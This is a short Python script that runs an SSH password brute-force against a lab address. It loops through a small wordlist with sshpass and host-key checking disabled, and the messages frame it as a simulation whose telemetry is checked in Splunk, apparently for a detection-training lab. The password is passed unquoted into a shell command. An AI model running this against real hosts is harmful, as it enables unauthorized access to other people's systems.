import subprocess
import time

target = "10.10.10.40"
user = "redacted"
passwords = ['abcd', '1234', 'pass', 'tryhackme', 'secure!', 'pass1', 'admin']

print(f"[*] Starting Brute Force Simulation on {target}...")

for password in passwords:
    print(f"[!] Testing password: {password}")
    
    cmd = f"sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{target} exit"
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] SUCCESS! Password found: {password}")
            break
        else:
            print(f"[-] Failed: {password}")
            
    except Exception as e:
        print(f"[x] Error during execution: {e}")

    time.sleep(1) 

print("[*] Simulation Complete. Check Splunk for telemetry.")
